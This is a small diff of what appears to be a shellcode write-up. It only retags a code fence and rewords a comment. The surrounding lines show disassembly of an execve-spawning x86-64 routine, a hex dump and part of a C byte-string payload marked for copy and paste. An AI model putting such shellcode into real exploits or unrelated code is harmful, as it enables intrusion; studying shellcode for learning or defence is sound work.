@@ -4,7 +4,7 @@ shellcode:     file format elf64-x86-64
 
 
 Disassembly of section .text:  
-```
+```assembly
 0000000000401000 <_start>:  
   401000:	6a 3b                	push   $0x3b  
   401002:	58                   	pop    %rax  
@@ -33,7 +33,7 @@ Disassembly of section .text:
 57 54 5e 0f 05 6a 3c 58
 48 31 ff 0f 05 
 
-# Easy copy/paste to use in C language 
+# Easy copy/paste to use in C
 ```
 "\x6A\x3B\x58\x48\x31\xD2\x48"
 "\xBB\x2F\x2F\x62\x69\x6E\x2F"
